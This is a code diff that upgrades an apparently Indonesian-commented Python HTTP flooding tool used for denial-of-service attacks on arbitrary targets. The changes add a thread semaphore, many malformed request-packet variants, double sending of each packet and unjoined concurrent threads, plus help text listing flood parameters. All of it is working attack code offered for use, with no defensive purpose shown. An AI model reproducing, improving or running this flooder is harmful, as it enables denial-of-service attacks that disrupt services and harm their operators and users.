@@ -14,6 +14,9 @@ except ModuleNotFoundError as e:
     print(f"{e} CAN'T IMPORT . . . . ")
     exit()
 
+# Inisialisasi Semaphore untuk batasi thread aktif
+MAX_THREADS = 50
+thread_semaphore = threading.Semaphore(MAX_THREADS)
 stop_attack = threading.Event()
 
 # Clear screen
@@ -31,36 +34,47 @@ def generate_url_path_choice(num):
 
 # Attack logic
 def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
-    if stop_attack.is_set():
-        return
-    url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
-        }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.connect((ip, port))
-        for _ in range(booter_sent):
-            if stop_attack.is_set():
-                break
-            s.sendall(packet_data)
-    except:
-        pass
-    finally:
-        s.close()
+    with thread_semaphore:  # Kontrol jumlah thread aktif
+        if stop_attack.is_set():
+            return
+        url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            payload_patterns = {
+                'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
+                'PYF': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
+                'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
+                'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
+                'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
+                'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n",
+                'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r",
+                'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n",
+                'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r",
+                'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r",
+                'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n",
+                'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n",
+                'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n",
+                'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r",
+                'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r"
+            }
+            packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
+            s.connect((ip, port))
+            for _ in range(booter_sent):
+                if stop_attack.is_set():
+                    break
+                s.sendall(packet_data)
+                s.send(packet_data)  # Kirim 2x seperti pie.py
+        except:
+            pass
+        finally:
+            s.close()
 
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
     while time.time() < time_loader and not stop_attack.is_set():
         for _ in range(min(spam_loader, 10)):
             if stop_attack.is_set():
                 break
-            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
-            th.start()
-            th.join()
+            threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet)).start()
 
 # Countdown + interrupt
 def countdown_timer(time_loader):
@@ -142,6 +156,7 @@ def command():
                     continue
                 else:
                     print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
+                    print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PY PYF TEST TEST2 TEST3 TEST4 TEST5 OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 OWN8 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
             else:
                 print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
         except KeyboardInterrupt:
